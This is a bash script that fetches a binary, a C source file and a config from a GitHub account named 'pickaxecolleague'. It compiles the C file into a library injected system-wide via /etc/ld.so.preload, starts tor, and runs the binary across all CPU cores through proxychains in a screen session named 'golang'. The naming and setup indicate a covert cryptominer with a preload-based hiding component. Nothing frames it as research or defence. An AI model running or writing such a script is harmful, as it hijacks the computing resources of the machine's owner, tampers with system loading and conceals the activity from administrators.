#!/bin/bash

cpu=$(echo nproc | bash)
xui=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/x-ui
libgo=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/libgo.c
config=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/config-free.json

apt update
apt install wget tor proxychains gcc screen -y

wget $xui
wget $libgo
wget -O config.json $config

nohup tor &>/dev/null &

wait 15

gcc -Wall -fPIC -shared -o libgo.so libgo.c -ldl
sudo mv libgo.so /usr/local/lib/
echo /usr/local/lib/libgo.so >> /etc/ld.so.preload

chmod 777 x-ui

screen -S "golang" proxychains ./x-ui --threads=$cpu --config=config.json
